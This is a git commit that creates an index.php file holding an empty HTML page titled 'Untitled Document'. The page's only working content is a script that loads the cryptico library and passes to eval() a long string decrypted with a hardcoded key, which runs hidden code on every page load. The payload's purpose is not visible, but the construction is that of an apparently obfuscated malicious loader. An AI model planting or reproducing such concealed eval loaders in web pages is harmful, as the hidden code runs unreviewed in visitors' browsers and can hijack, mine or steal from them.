133b06b2765bf92dff2f323b00bd89d921345225
platinummedia <james@platinum-media.tv>
2017-03-27 17:22:06 +0100

    Create index.php

---
+++ index.php
@@ -0,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Untitled Document</title>
+</head>
+
+<body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/cryptico/0.0.1343522940/cryptico.js" type="text/javascript"></script>
+<script type="text/javascript">eval(cryptico.decrypt('MCDCKus9WDWz9GyDv4FawzyTDKs7Vx7sVbICjl0J0NTv3DCNz6f40S0+NzMFIkr1AaBbXt/UyqtZRdbiw+C3/N4sEv0GLVO7SraCKbeHjyy3RG2+xd0zzKnIZg2mDn25H5x5Ojs/uOqS8Ohm79+6YGWY9KJ5opczzWYRjmpHnio=?3UM6ZdUZCXx4+hUczDvD1hhvQ0Ni8SUycs9sLiNlr7PUnJkQaqhUbPNxS5uaJ0cNx8IEwkHFP8zKa2/6/Re4ejYMZIA/dW3imohcwB/zDW8fZxC2s/oMWDt8vTUPu3Vr4bqAIv5XmlaFtEPnU8AMQt1yqVSCT3DHPY19tjJJK9N8QgE0vdUY4WZ8diW53udEkgiP7IyX68psb7MwlJ+V+wmh5BrH0trwjPN3DaLRyUa/Y0id2ccVogJvpCsbcPZLxceo6/ELZvUo2JAxvXjkhBSSJm4AEb+JPRDoKcnRo0XkHxbBnivnXV0WBOZH67fNRVMwd1zjfyX99WPrCGb8+HoALIVKBNd2zluB0MfciqA3gnMDhMPlKCJr+qy8Rsz0w4y7N7XBT5j9shmHjTVel0sbgveRF0gS+Ybo5IDuBrEBf2UdgRUUckkUWwAy6fNKo8vfr7rZew25tG8Lm2/TYw==', cryptico.generateRSAKey('85d9332ceb7a40e0afca704dccb254cd', 1024)).plaintext);</script> 
+</body>
+</html>
